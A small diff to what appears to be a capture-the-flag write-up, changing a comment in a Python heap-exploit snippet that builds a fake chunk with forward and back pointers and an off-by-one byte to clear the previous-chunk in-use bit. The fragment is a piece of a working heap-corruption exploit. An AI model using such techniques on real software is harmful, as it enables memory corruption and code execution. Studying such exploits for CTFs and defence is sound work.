@@ -502,7 +502,7 @@ fake_chunk += p64(fd)
 fake_chunk += p64(bk)
 fake_chunk += 'A'*0x60
 fake_chunk += p64(0x80)		# size previe
-fake_chunk += p8(0x90)      	# before chuck is free
+fake_chunk += p8(0x90)      	# before chuck is free - default 0x91 one off byte -> 0x90
 
 edit(fake_chunk, 9)
 ```
